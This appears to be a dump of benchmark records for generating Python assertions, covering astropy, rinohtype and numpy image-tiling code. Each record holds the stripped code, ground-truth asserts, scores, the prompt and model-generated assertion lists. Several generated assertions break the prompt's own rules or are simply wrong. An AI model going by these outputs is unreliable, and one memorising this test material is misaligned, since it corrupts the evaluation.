            shutil.rmtree(self.out_dir)

        validate.check_conesearch_sites(
            destdir=self.out_dir, parallel=parallel, url_list=None)

        for val in self.filenames.values():
            self._compare_catnames(get_pkg_data_filename(
                os.path.join(self.datadir, val)),
                os.path.join(self.out_dir, val))

    @pytest.mark.parametrize(('parallel'), [True, False])
    def test_url_list(self, parallel):
        local_outdir = os.path.join(self.out_dir, 'subtmp1')
        local_list = [
            'http://www.google.com/foo&',
            'http://vizier.u-strasbg.fr/viz-bin/votable/-A?-out.all&-source=I/252/out&']
        validate.check_conesearch_sites(destdir=local_outdir,
                                        parallel=parallel,
                                        url_list=local_list)
        self._compare_catnames(get_pkg_data_filename(
            os.path.join(self.datadir, self.filenames['good'])),
            os.path.join(local_outdir, self.filenames['good']))

    def teardown_class(self):
        conf.reset('conesearch_master_list')
        data.conf.reset('remote_timeout')
        shutil.rmtree(self.out_dir)
","
1# Licensed under a 3-clause BSD style license - see LICENSE.rst
2""""""Tests for `astropy.vo.validator.validate`.
3
4.. note::
5
6    This test will fail if external URL query status
7    changes. This is beyond the control of AstroPy.
8    When this happens, rerun or update the test.
9
10""""""
11from __future__ import absolute_import, division, print_function, unicode_literals
12
13# STDLIB
14import os
15import shutil
16import tempfile
17import warnings
18
19import pytest
20
21# LOCAL
22from .. import conf
23from .. import validate
24from ...client.vos_catalog import VOSDatabase
25from ....tests.helper import remote_data
26from ....utils.data import get_pkg_data_filename
27from ....utils.exceptions import AstropyDeprecationWarning
28from ....utils import data
29
30
31__doctest_skip__ = ['*']
32
33
34def setup_module():
35    """"""Ignore all deprecation warnings here.""""""
36    warnings.simplefilter('ignore', AstropyDeprecationWarning)
37
38
39def teardown_module():
40    warnings.resetwarnings()
41
42
43@remote_data
44class TestConeSearchValidation(object):
45    """"""Validation on a small subset of Cone Search sites.""""""
46    def setup_class(self):
47        self.datadir = 'data'
48        self.out_dir = tempfile.mkdtemp()
49        self.filenames = {
50            'good': 'conesearch_good.json',
51            'warn': 'conesearch_warn.json',
52            'excp': 'conesearch_exception.json',
53            'nerr': 'conesearch_error.json'}
54
55        conf.conesearch_master_list = get_pkg_data_filename(os.path.join(
56            self.datadir, 'vao_conesearch_sites_121107_subset.xml'))
57
58        data.conf.remote_timeout = 30
59
60    @staticmethod
61    def _compare_catnames(fname1, fname2):
62        db1 = VOSDatabase.from_json(fname1)
63        db2 = VOSDatabase.from_json(fname2)
64
65    @pytest.mark.parametrize(('parallel'), [True, False])
66    def test_validation(self, parallel):
67        if os.path.exists(self.out_dir):
68            shutil.rmtree(self.out_dir)
69
70        validate.check_conesearch_sites(
71            destdir=self.out_dir, parallel=parallel, url_list=None)
72
73        for val in self.filenames.values():
74            self._compare_catnames(get_pkg_data_filename(
75                os.path.join(self.datadir, val)),
76                os.path.join(self.out_dir, val))
77
78    @pytest.mark.parametrize(('parallel'), [True, False])
79    def test_url_list(self, parallel):
80        local_outdir = os.path.join(self.out_dir, 'subtmp1')
81        local_list = [
82            'http://www.google.com/foo&',
83            'http://vizier.u-strasbg.fr/viz-bin/votable/-A?-out.all&-source=I/252/out&']
84        validate.check_conesearch_sites(destdir=local_outdir,
85                                        parallel=parallel,
86                                        url_list=local_list)
87        self._compare_catnames(get_pkg_data_filename(
88            os.path.join(self.datadir, self.filenames['good'])),
89            os.path.join(local_outdir, self.filenames['good']))
90
91    def teardown_class(self):
92        conf.reset('conesearch_master_list')
93        data.conf.reset('remote_timeout')
94        shutil.rmtree(self.out_dir)
95","[['db1.list_catalogs()', '==', 'db2.list_catalogs()']]",1,1,1.0,0.0003253090435914,"['__doctest_skip__', 'self.datadir', 'self.out_dir', 'self.filenames', 'conf.conesearch_master_list', 'data.conf.remote_timeout', 'fname1', 'fname2', 'db1', 'db2', 'parallel', 'local_outdir', 'local_list']",13,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['__doctest_skip__', 'self.datadir', 'self.out_dir', 'self.filenames', 'conf.conesearch_master_list', 'data.conf.remote_timeout', 'fname1', 'fname2', 'db1', 'db2', 'parallel', 'local_outdir', 'local_list']
*Code:

1# Licensed under a 3-clause BSD style license - see LICENSE.rst
2""""""Tests for `astropy.vo.validator.validate`.
3
4.. note::
5
6    This test will fail if external URL query status
7    changes. This is beyond the control of AstroPy.
8    When this happens, rerun or update the test.
9
10""""""
11from __future__ import absolute_import, division, print_function, unicode_literals
12
13# STDLIB
14import os
15import shutil
16import tempfile
17import warnings
18
19import pytest
20
21# LOCAL
22from .. import conf
23from .. import validate
24from ...client.vos_catalog import VOSDatabase
25from ....tests.helper import remote_data
26from ....utils.data import get_pkg_data_filename
27from ....utils.exceptions import AstropyDeprecationWarning
28from ....utils import data
29
30
31__doctest_skip__ = ['*']
32
33
34def setup_module():
35    """"""Ignore all deprecation warnings here.""""""
36    warnings.simplefilter('ignore', AstropyDeprecationWarning)
37
38
39def teardown_module():
40    warnings.resetwarnings()
41
42
43@remote_data
44class TestConeSearchValidation(object):
45    """"""Validation on a small subset of Cone Search sites.""""""
46    def setup_class(self):
47        self.datadir = 'data'
48        self.out_dir = tempfile.mkdtemp()
49        self.filenames = {
50            'good': 'conesearch_good.json',
51            'warn': 'conesearch_warn.json',
52            'excp': 'conesearch_exception.json',
53            'nerr': 'conesearch_error.json'}
54
55        conf.conesearch_master_list = get_pkg_data_filename(os.path.join(
56            self.datadir, 'vao_conesearch_sites_121107_subset.xml'))
57
58        data.conf.remote_timeout = 30
59
60    @staticmethod
61    def _compare_catnames(fname1, fname2):
62        db1 = VOSDatabase.from_json(fname1)
63        db2 = VOSDatabase.from_json(fname2)
64
65    @pytest.mark.parametrize(('parallel'), [True, False])
66    def test_validation(self, parallel):
67        if os.path.exists(self.out_dir):
68            shutil.rmtree(self.out_dir)
69
70        validate.check_conesearch_sites(
71            destdir=self.out_dir, parallel=parallel, url_list=None)
72
73        for val in self.filenames.values():
74            self._compare_catnames(get_pkg_data_filename(
75                os.path.join(self.datadir, val)),
76                os.path.join(self.out_dir, val))
77
78    @pytest.mark.parametrize(('parallel'), [True, False])
79    def test_url_list(self, parallel):
80        local_outdir = os.path.join(self.out_dir, 'subtmp1')
81        local_list = [
82            'http://www.google.com/foo&',
83            'http://vizier.u-strasbg.fr/viz-bin/votable/-A?-out.all&-source=I/252/out&']
84        validate.check_conesearch_sites(destdir=local_outdir,
85                                        parallel=parallel,
86                                        url_list=local_list)
87        self._compare_catnames(get_pkg_data_filename(
88            os.path.join(self.datadir, self.filenames['good'])),
89            os.path.join(local_outdir, self.filenames['good']))
90
91    def teardown_class(self):
92        conf.reset('conesearch_master_list')
93        data.conf.reset('remote_timeout')
94        shutil.rmtree(self.out_dir)
95",4783,"[46, 'self.datadir', '!=', '', ""directory path should not be empty""],
[46, 'self.out_dir', '!=', '', ""directory path should not be empty""],
[46, 'self.filenames', '==', 4, ""filenames dictionary should contain 4 key-value pairs""],
[58, 'data.conf.remote_timeout', '>', 0, ""timeout should be a positive integer""],
[62, 'fname1', '!=', '', ""filename should not be empty""],
[62, 'fname2', '!=', '', ""filename should not be empty""],
[70, 'self.out_dir', '!=', '', ""directory path should not be empty""],
[70, 'parallel', '==', bool, ""parallel should be a boolean value""],
[80, 'local_outdir', '!=', '', ""directory path should not be empty""],
[80, 'parallel', '==', bool, ""parallel should be a boolean value""],
[80, 'local_list', '==', 2, ""local_list should contain 2 urls""],
[92, 'self.out_dir', '!=', '', ""directory path should not be empty""]"
brechtm/rinohtype,"# This file is part of rinohtype, the Python document preparation system.
#
# Copyright (c) Brecht Machiels.
#
# Use of this source code is subject to the terms of the GNU Affero General
# Public License v3. See the LICENSE file or http://www.gnu.org/licenses/.


import re

from ... import styleds
from ...annotation import HyperLink, NamedDestination

from . import EPubInlineNode, EPubBodyNode, EPubGroupingNode


class Body(EPubBodyNode):
    pass


class Section(EPubGroupingNode):
    grouped_flowables_class = styleds.Section


class Div(EPubGroupingNode):
    grouped_flowables_class = styleds.Section

    RE_SECTION = re.compile(r'sect\d+')

    def build_flowables(self, **kwargs):
        div_class = self.get('class')
        if div_class and self.RE_SECTION.match(div_class):
            return super().build_flowables(**kwargs)
        else:
            return self.children_flowables()


class Img(EPubBodyNode, EPubInlineNode):
    @property
    def image_path(self):
        return self.get('src')

    def build_flowable(self):
        return styleds.Image(self.image_path)

    def build_styled_text(self, strip_leading_whitespace=False):
        return styleds.InlineImage(self.image_path)


class P(EPubBodyNode):
    def build_flowable(self):
        return styleds.Paragraph(super().process_content())


class H(EPubBodyNode):
    @property
    def in_section(self):
        parent = self.parent
        while not isinstance(parent, Body):
            if isinstance(parent, Section):
                return True
            parent = parent.parent
        return False

    def build_flowable(self):
        if self.in_section:
            try:
                kwargs = dict(custom_label=self.generated.build_styled_text())
            except AttributeError:
                kwargs = dict()
            return styleds.Heading(self.process_content(), **kwargs)
        else:
            return styleds.Paragraph(self.process_content())


class H1(H):
    pass


class H2(H):
    pass


class H3(H):
    pass


class H4(H):
    pass


class Span(EPubInlineNode):
    def build_styled_text(self, strip_leading_whitespace):
        text = styleds.MixedStyledText(self.process_content())
        text.classes = self.get('class').split(' ')
        return text


class Em(EPubInlineNode):
    def build_styled_text(self, strip_leading_whitespace):
        return styleds.MixedStyledText(self.process_content(), style='emphasis')


class Strong(EPubInlineNode):
    def build_styled_text(self, strip_leading_whitespace):
        return styleds.MixedStyledText(self.process_content(), style='strong')


class Sup(EPubInlineNode):
    def build_styled_text(self, strip_leading_whitespace):
        return styleds.Superscript(self.process_content())


class Sub(EPubInlineNode):
    def build_styled_text(self, strip_leading_whitespace):
        return styleds.Subscript(self.process_content())


class Br(EPubBodyNode, EPubInlineNode):
    def build_flowables(self):
        return
        yield

    def build_styled_text(self, strip_leading_whitespace):
        return styleds.Newline()



class Blockquote(EPubGroupingNode):
    style = 'block quote'


class HR(EPubBodyNode):
    def build_flowable(self):
        return styleds.HorizontalRule()


class A(EPubBodyNode, EPubInlineNode):
    def build_styled_text(self, strip_leading_whitespace):
        if self.get('href'):
            annotation = HyperLink(self.get('href'))
            style = 'external link'
        elif self.get('id'):
            annotation = NamedDestination(self.get('id'))
            style = None
        # else:
        #     return styleds.MixedStyledText(self.process_content(),
        #                               style='broken link')
        content = self.process_content(style=style)
        content.annotation = annotation
        return content

    def build_flowables(self):
        children = self.getchildren()
        assert len(children) == 0
        return
        yield


class OL(EPubBodyNode):
    def build_flowable(self):
        return styleds.List([item.flowable() for item in self.li],
                            style='enumerated')


class UL(EPubBodyNode):
    def build_flowable(self):
        return styleds.List([item.flowable() for item in self.li],
                            style='bulleted')


class LI(EPubGroupingNode):
    pass


class DL(EPubBodyNode):
    def build_flowable(self):
        items = [(dt.flowable(), dd.flowable())
                 for dt, dd in zip(self.dt, self.dd)]
        return styleds.DefinitionList(items)


class DT(EPubBodyNode):
    def build_flowable(self):
        term = styleds.Paragraph(self.process_content())
        return styleds.DefinitionTerm([term])


class DD(EPubGroupingNode):
    grouped_flowables_class = styleds.Definition
","
1# This file is part of rinohtype, the Python document preparation system.
2#
3# Copyright (c) Brecht Machiels.
4#
5# Use of this source code is subject to the terms of the GNU Affero General
6# Public License v3. See the LICENSE file or http://www.gnu.org/licenses/.
7
8
9import re
10
11from ... import styleds
12from ...annotation import HyperLink, NamedDestination
13
14from . import EPubInlineNode, EPubBodyNode, EPubGroupingNode
15
16
17class Body(EPubBodyNode):
18    pass
19
20
21class Section(EPubGroupingNode):
22    grouped_flowables_class = styleds.Section
23
24
25class Div(EPubGroupingNode):
26    grouped_flowables_class = styleds.Section
27
28    RE_SECTION = re.compile(r'sect\d+')
29
30    def build_flowables(self, **kwargs):
31        div_class = self.get('class')
32        if div_class and self.RE_SECTION.match(div_class):
33            return super().build_flowables(**kwargs)
34        else:
35            return self.children_flowables()
36
37
38class Img(EPubBodyNode, EPubInlineNode):
39    @property
40    def image_path(self):
41        return self.get('src')
42
43    def build_flowable(self):
44        return styleds.Image(self.image_path)
45
46    def build_styled_text(self, strip_leading_whitespace=False):
47        return styleds.InlineImage(self.image_path)
48
49
50class P(EPubBodyNode):
51    def build_flowable(self):
52        return styleds.Paragraph(super().process_content())
53
54
55class H(EPubBodyNode):
56    @property
57    def in_section(self):
58        parent = self.parent
59        while not isinstance(parent, Body):
60            if isinstance(parent, Section):
61                return True
62            parent = parent.parent
63        return False
64
65    def build_flowable(self):
66        if self.in_section:
67            try:
68                kwargs = dict(custom_label=self.generated.build_styled_text())
69            except AttributeError:
70                kwargs = dict()
71            return styleds.Heading(self.process_content(), **kwargs)
72        else:
73            return styleds.Paragraph(self.process_content())
74
75
76class H1(H):
77    pass
78
79
80class H2(H):
81    pass
82
83
84class H3(H):
85    pass
86
87
88class H4(H):
89    pass
90
91
92class Span(EPubInlineNode):
93    def build_styled_text(self, strip_leading_whitespace):
94        text = styleds.MixedStyledText(self.process_content())
95        text.classes = self.get('class').split(' ')
96        return text
97
98
99class Em(EPubInlineNode):
100    def build_styled_text(self, strip_leading_whitespace):
101        return styleds.MixedStyledText(self.process_content(), style='emphasis')
102
103
104class Strong(EPubInlineNode):
105    def build_styled_text(self, strip_leading_whitespace):
106        return styleds.MixedStyledText(self.process_content(), style='strong')
107
108
109class Sup(EPubInlineNode):
110    def build_styled_text(self, strip_leading_whitespace):
111        return styleds.Superscript(self.process_content())
112
113
114class Sub(EPubInlineNode):
115    def build_styled_text(self, strip_leading_whitespace):
116        return styleds.Subscript(self.process_content())
117
118
119class Br(EPubBodyNode, EPubInlineNode):
120    def build_flowables(self):
121        return
122        yield
123
124    def build_styled_text(self, strip_leading_whitespace):
125        return styleds.Newline()
126
127
128
129class Blockquote(EPubGroupingNode):
130    style = 'block quote'
131
132
133class HR(EPubBodyNode):
134    def build_flowable(self):
135        return styleds.HorizontalRule()
136
137
138class A(EPubBodyNode, EPubInlineNode):
139    def build_styled_text(self, strip_leading_whitespace):
140        if self.get('href'):
141            annotation = HyperLink(self.get('href'))
142            style = 'external link'
143        elif self.get('id'):
144            annotation = NamedDestination(self.get('id'))
145            style = None
146        # else:
147        #     return styleds.MixedStyledText(self.process_content(),
148        #                               style='broken link')
149        content = self.process_content(style=style)
150        content.annotation = annotation
151        return content
152
153    def build_flowables(self):
154        children = self.getchildren()
155        return
156        yield
157
158
159class OL(EPubBodyNode):
160    def build_flowable(self):
161        return styleds.List([item.flowable() for item in self.li],
162                            style='enumerated')
163
164
165class UL(EPubBodyNode):
166    def build_flowable(self):
167        return styleds.List([item.flowable() for item in self.li],
168                            style='bulleted')
169
170
171class LI(EPubGroupingNode):
172    pass
173
174
175class DL(EPubBodyNode):
176    def build_flowable(self):
177        items = [(dt.flowable(), dd.flowable())
178                 for dt, dd in zip(self.dt, self.dd)]
179        return styleds.DefinitionList(items)
180
181
182class DT(EPubBodyNode):
183    def build_flowable(self):
184        term = styleds.Paragraph(self.process_content())
185        return styleds.DefinitionTerm([term])
186
187
188class DD(EPubGroupingNode):
189    grouped_flowables_class = styleds.Definition
190","[['len(children)', '==', '0']]",1,1,1.0,0.0002079866888519,"['grouped_flowables_class', 'RE_SECTION', '**kwargs', 'div_class', 'strip_leading_whitespace', 'parent', 'kwargs', 'text', 'text.classes', 'style', 'annotation', 'content', 'content.annotation', 'children', 'items', 'term']",16,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['grouped_flowables_class', 'RE_SECTION', '**kwargs', 'div_class', 'strip_leading_whitespace', 'parent', 'kwargs', 'text', 'text.classes', 'style', 'annotation', 'content', 'content.annotation', 'children', 'items', 'term']
*Code:

1# This file is part of rinohtype, the Python document preparation system.
2#
3# Copyright (c) Brecht Machiels.
4#
5# Use of this source code is subject to the terms of the GNU Affero General
6# Public License v3. See the LICENSE file or http://www.gnu.org/licenses/.
7
8
9import re
10
11from ... import styleds
12from ...annotation import HyperLink, NamedDestination
13
14from . import EPubInlineNode, EPubBodyNode, EPubGroupingNode
15
16
17class Body(EPubBodyNode):
18    pass
19
20
21class Section(EPubGroupingNode):
22    grouped_flowables_class = styleds.Section
23
24
25class Div(EPubGroupingNode):
26    grouped_flowables_class = styleds.Section
27
28    RE_SECTION = re.compile(r'sect\d+')
29
30    def build_flowables(self, **kwargs):
31        div_class = self.get('class')
32        if div_class and self.RE_SECTION.match(div_class):
33            return super().build_flowables(**kwargs)
34        else:
35            return self.children_flowables()
36
37
38class Img(EPubBodyNode, EPubInlineNode):
39    @property
40    def image_path(self):
41        return self.get('src')
42
43    def build_flowable(self):
44        return styleds.Image(self.image_path)
45
46    def build_styled_text(self, strip_leading_whitespace=False):
47        return styleds.InlineImage(self.image_path)
48
49
50class P(EPubBodyNode):
51    def build_flowable(self):
52        return styleds.Paragraph(super().process_content())
53
54
55class H(EPubBodyNode):
56    @property
57    def in_section(self):
58        parent = self.parent
59        while not isinstance(parent, Body):
60            if isinstance(parent, Section):
61                return True
62            parent = parent.parent
63        return False
64
65    def build_flowable(self):
66        if self.in_section:
67            try:
68                kwargs = dict(custom_label=self.generated.build_styled_text())
69            except AttributeError:
70                kwargs = dict()
71            return styleds.Heading(self.process_content(), **kwargs)
72        else:
73            return styleds.Paragraph(self.process_content())
74
75
76class H1(H):
77    pass
78
79
80class H2(H):
81    pass
82
83
84class H3(H):
85    pass
86
87
88class H4(H):
89    pass
90
91
92class Span(EPubInlineNode):
93    def build_styled_text(self, strip_leading_whitespace):
94        text = styleds.MixedStyledText(self.process_content())
95        text.classes = self.get('class').split(' ')
96        return text
97
98
99class Em(EPubInlineNode):
100    def build_styled_text(self, strip_leading_whitespace):
101        return styleds.MixedStyledText(self.process_content(), style='emphasis')
102
103
104class Strong(EPubInlineNode):
105    def build_styled_text(self, strip_leading_whitespace):
106        return styleds.MixedStyledText(self.process_content(), style='strong')
107
108
109class Sup(EPubInlineNode):
110    def build_styled_text(self, strip_leading_whitespace):
111        return styleds.Superscript(self.process_content())
112
113
114class Sub(EPubInlineNode):
115    def build_styled_text(self, strip_leading_whitespace):
116        return styleds.Subscript(self.process_content())
117
118
119class Br(EPubBodyNode, EPubInlineNode):
120    def build_flowables(self):
121        return
122        yield
123
124    def build_styled_text(self, strip_leading_whitespace):
125        return styleds.Newline()
126
127
128
129class Blockquote(EPubGroupingNode):
130    style = 'block quote'
131
132
133class HR(EPubBodyNode):
134    def build_flowable(self):
135        return styleds.HorizontalRule()
136
137
138class A(EPubBodyNode, EPubInlineNode):
139    def build_styled_text(self, strip_leading_whitespace):
140        if self.get('href'):
141            annotation = HyperLink(self.get('href'))
142            style = 'external link'
143        elif self.get('id'):
144            annotation = NamedDestination(self.get('id'))
145            style = None
146        # else:
147        #     return styleds.MixedStyledText(self.process_content(),
148        #                               style='broken link')
149        content = self.process_content(style=style)
150        content.annotation = annotation
151        return content
152
153    def build_flowables(self):
154        children = self.getchildren()
155        return
156        yield
157
158
159class OL(EPubBodyNode):
160    def build_flowable(self):
161        return styleds.List([item.flowable() for item in self.li],
162                            style='enumerated')
163
164
165class UL(EPubBodyNode):
166    def build_flowable(self):
167        return styleds.List([item.flowable() for item in self.li],
168                            style='bulleted')
169
170
171class LI(EPubGroupingNode):
172    pass
173
174
175class DL(EPubBodyNode):
176    def build_flowable(self):
177        items = [(dt.flowable(), dd.flowable())
178                 for dt, dd in zip(self.dt, self.dd)]
179        return styleds.DefinitionList(items)
180
181
182class DT(EPubBodyNode):
183    def build_flowable(self):
184        term = styleds.Paragraph(self.process_content())
185        return styleds.DefinitionTerm([term])
186
187
188class DD(EPubGroupingNode):
189    grouped_flowables_class = styleds.Definition
190",6840,"[[30, '**kwargs', '!=', None, ""Function parameters must not be None""],
[33, '**kwargs', '!=', None, ""Function parameters must not be None""],
[44, 'self.image_path', '!=', None, ""Image path must not be None""],
[47, 'self.image_path', '!=', None, ""Image path must not be None""],
[58, 'self.parent', '!=', None, ""Section must have a parent""],
[94, 'strip_leading_whitespace', '==', False, ""Leading whitespace flag should be off""],
[106, 'strip_leading_whitespace', '==', False, ""Leading whitespace flag should be off""],
[110, 'strip_leading_whitespace', '==', False, ""Leading whitespace flag should be off""],
[115, 'strip_leading_whitespace', '==', False, ""Leading whitespace flag should be off""],
[154, 'children', '!=', None, ""Children must not be None""],
[161, 'self.li', '!=', None, ""List items must not be None""],
[167, 'self.li', '!=', None, ""List items must not be None""]]"
hycis/Mozi,"import numpy

'''
Adapted from http://deeplearning.net/tutorial/code/utils.py
'''


def scale_to_unit_interval(ndar, eps=1e-8):
    """""" Scales all values in the ndarray ndar to be between 0 and 1 """"""
    ndar = ndar.copy()
    ndar -= ndar.min()
    ndar *= 1.0 / (ndar.max() + eps)
    return ndar

def tile_raster_images(X, img_shape, tile_shape, tile_spacing=(0, 0),
                       scale_rows_to_unit_interval=True,
                       output_pixel_vals=True):
    """"""
    Transform an array with one flattened image per row, into an array in
    which images are reshaped and layed out like tiles on a floor.

    This function is useful for visualizing datasets whose rows are images,
    and also columns of matrices for transforming those rows
    (such as the first layer of a neural net).

    :type X: a 2-D ndarray or a tuple of 4 channels, elements of which can
    be 2-D ndarrays or None;
    :param X: a 2-D array in which every row is a flattened image.

    :type img_shape: tuple; (height, width)
    :param img_shape: the original shape of each image

    :type tile_shape: tuple; (rows, cols)
    :param tile_shape: the number of images to tile (rows, cols)

    :param output_pixel_vals: if output should be pixel values (i.e. int8
    values) or floats

    :param scale_rows_to_unit_interval: if the values need to be scaled before
    being plotted to [0,1] or not


    :returns: array suitable for viewing as an image.
    (See:`PIL.Image.fromarray`.)
    :rtype: a 2-d array with same dtype as X.

    """"""

    assert len(img_shape) == 2
    assert len(tile_shape) == 2
    assert len(tile_spacing) == 2

    # The expression below can be re-written in a more C style as
    # follows :
    #
    # out_shape    = [0,0]
    # out_shape[0] = (img_shape[0]+tile_spacing[0])*tile_shape[0] -
    #                tile_spacing[0]
    # out_shape[1] = (img_shape[1]+tile_spacing[1])*tile_shape[1] -
    #                tile_spacing[1]
    out_shape = [(ishp + tsp) * tshp - tsp for ishp, tshp, tsp
                        in zip(img_shape, tile_shape, tile_spacing)]

    if isinstance(X, (list, tuple)):
        assert len(X) == 4
        # Create an output numpy ndarray to store the image
        if output_pixel_vals:
            out_array = numpy.zeros((out_shape[0], out_shape[1], 4),
                                    dtype='uint8')
        else:
            out_array = numpy.zeros((out_shape[0], out_shape[1], 4),
                                    dtype=X.dtype)

        #colors default to 0, alpha defaults to 1 (opaque)
        if output_pixel_vals:
            channel_defaults = [0, 0, 0, 255]
        else:
            channel_defaults = [0., 0., 0., 1.]

        for i in xrange(4):
            if X[i] is None:
                # if channel is None, fill it with zeros of the correct
                # dtype
                dt = out_array.dtype
                if output_pixel_vals:
                    dt = 'uint8'
                out_array[:, :, i] = numpy.zeros(out_shape,
                        dtype=dt) + channel_defaults[i]
            else:
                # use a recurrent call to compute the channel and store it
                # in the output
                out_array[:, :, i] = tile_raster_images(
                    X[i], img_shape, tile_shape, tile_spacing,
                    scale_rows_to_unit_interval, output_pixel_vals)
        return out_array

    else:
        # if we are dealing with only one channel
        H, W = img_shape
        Hs, Ws = tile_spacing

        # generate a matrix to store the output
        dt = X.dtype
        if output_pixel_vals:
            dt = 'uint8'
        out_array = numpy.zeros(out_shape, dtype=dt)

        for tile_row in xrange(tile_shape[0]):
            for tile_col in xrange(tile_shape[1]):
                if tile_row * tile_shape[1] + tile_col < X.shape[0]:
                    this_x = X[tile_row * tile_shape[1] + tile_col]
                    if scale_rows_to_unit_interval:
                        # if we should scale values to be between 0 and 1
                        # do this by calling the `scale_to_unit_interval`
                        # function
                        this_img = scale_to_unit_interval(
                            this_x.reshape(img_shape))
                    else:
                        this_img = this_x.reshape(img_shape)
                    # add the slice to the corresponding position in the
                    # output array
                    c = 1
                    if output_pixel_vals:
                        c = 255
                    out_array[
                        tile_row * (H + Hs): tile_row * (H + Hs) + H,
                        tile_col * (W + Ws): tile_col * (W + Ws) + W
                        ] = this_img * c
        return out_array
","
1import numpy
2
3'''
4Adapted from http://deeplearning.net/tutorial/code/utils.py
5'''
6
7
8def scale_to_unit_interval(ndar, eps=1e-8):
9    """""" Scales all values in the ndarray ndar to be between 0 and 1 """"""
10    ndar = ndar.copy()
11    ndar -= ndar.min()
12    ndar *= 1.0 / (ndar.max() + eps)
13    return ndar
14
15def tile_raster_images(X, img_shape, tile_shape, tile_spacing=(0, 0),
16                       scale_rows_to_unit_interval=True,
17                       output_pixel_vals=True):
18    """"""
19    Transform an array with one flattened image per row, into an array in
20    which images are reshaped and layed out like tiles on a floor.
21
22    This function is useful for visualizing datasets whose rows are images,
23    and also columns of matrices for transforming those rows
24    (such as the first layer of a neural net).
25
26    :type X: a 2-D ndarray or a tuple of 4 channels, elements of which can
27    be 2-D ndarrays or None;
28    :param X: a 2-D array in which every row is a flattened image.
29
30    :type img_shape: tuple; (height, width)
31    :param img_shape: the original shape of each image
32
33    :type tile_shape: tuple; (rows, cols)
34    :param tile_shape: the number of images to tile (rows, cols)
35
36    :param output_pixel_vals: if output should be pixel values (i.e. int8
37    values) or floats
38
39    :param scale_rows_to_unit_interval: if the values need to be scaled before
40    being plotted to [0,1] or not
41
42
43    :returns: array suitable for viewing as an image.
44    (See:`PIL.Image.fromarray`.)
45    :rtype: a 2-d array with same dtype as X.
46
47    """"""
48
49
50    # The expression below can be re-written in a more C style as
51    # follows :
52    #
53    # out_shape    = [0,0]
54    # out_shape[0] = (img_shape[0]+tile_spacing[0])*tile_shape[0] -
55    #                tile_spacing[0]
56    # out_shape[1] = (img_shape[1]+tile_spacing[1])*tile_shape[1] -
57    #                tile_spacing[1]
58    out_shape = [(ishp + tsp) * tshp - tsp for ishp, tshp, tsp
59                        in zip(img_shape, tile_shape, tile_spacing)]
60
61    if isinstance(X, (list, tuple)):
62        # Create an output numpy ndarray to store the image
63        if output_pixel_vals:
64            out_array = numpy.zeros((out_shape[0], out_shape[1], 4),
65                                    dtype='uint8')
66        else:
67            out_array = numpy.zeros((out_shape[0], out_shape[1], 4),
68                                    dtype=X.dtype)
69
70        #colors default to 0, alpha defaults to 1 (opaque)
71        if output_pixel_vals:
72            channel_defaults = [0, 0, 0, 255]
73        else:
74            channel_defaults = [0., 0., 0., 1.]
75
76        for i in xrange(4):
77            if X[i] is None:
78                # if channel is None, fill it with zeros of the correct
79                # dtype
80                dt = out_array.dtype
81                if output_pixel_vals:
82                    dt = 'uint8'
83                out_array[:, :, i] = numpy.zeros(out_shape,
84                        dtype=dt) + channel_defaults[i]
85            else:
86                # use a recurrent call to compute the channel and store it
87                # in the output
88                out_array[:, :, i] = tile_raster_images(
89                    X[i], img_shape, tile_shape, tile_spacing,
90                    scale_rows_to_unit_interval, output_pixel_vals)
91        return out_array
92
93    else:
94        # if we are dealing with only one channel
95        H, W = img_shape
96        Hs, Ws = tile_spacing
97
98        # generate a matrix to store the output
99        dt = X.dtype
100        if output_pixel_vals:
101            dt = 'uint8'
102        out_array = numpy.zeros(out_shape, dtype=dt)
103
104        for tile_row in xrange(tile_shape[0]):
105            for tile_col in xrange(tile_shape[1]):
106                if tile_row * tile_shape[1] + tile_col < X.shape[0]:
107                    this_x = X[tile_row * tile_shape[1] + tile_col]
108                    if scale_rows_to_unit_interval:
109                        # if we should scale values to be between 0 and 1
110                        # do this by calling the `scale_to_unit_interval`
111                        # function
112                        this_img = scale_to_unit_interval(
113                            this_x.reshape(img_shape))
114                    else:
115                        this_img = this_x.reshape(img_shape)
116                    # add the slice to the corresponding position in the
117                    # output array
118                    c = 1
119                    if output_pixel_vals:
120                        c = 255
121                    out_array[
122                        tile_row * (H + Hs): tile_row * (H + Hs) + H,
123                        tile_col * (W + Ws): tile_col * (W + Ws) + W
124                        ] = this_img * c
125        return out_array
